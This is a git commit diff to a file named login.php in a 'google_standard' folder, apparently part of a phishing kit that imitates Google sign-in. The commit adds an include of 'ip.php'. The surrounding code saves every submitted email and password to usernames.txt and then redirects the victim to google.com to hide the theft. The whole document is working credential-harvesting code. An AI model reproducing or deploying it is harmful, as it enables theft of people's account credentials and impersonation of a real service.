b8891baf3bda42ce541d807eaf17b1e3e087d94f
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-07 14:21:17 +0500

    Update login.php

--- WebPages/google_standard/login.php
+++ WebPages/google_standard/login.php
@@ -1,5 +1,6 @@
 <?php
 include 'base.php';
+include 'ip.php';
 
 file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['Email'] . " [PASS]: " . $_POST['Passwd'] . "\n", FILE_APPEND);
 header('Location: https://google.com/');
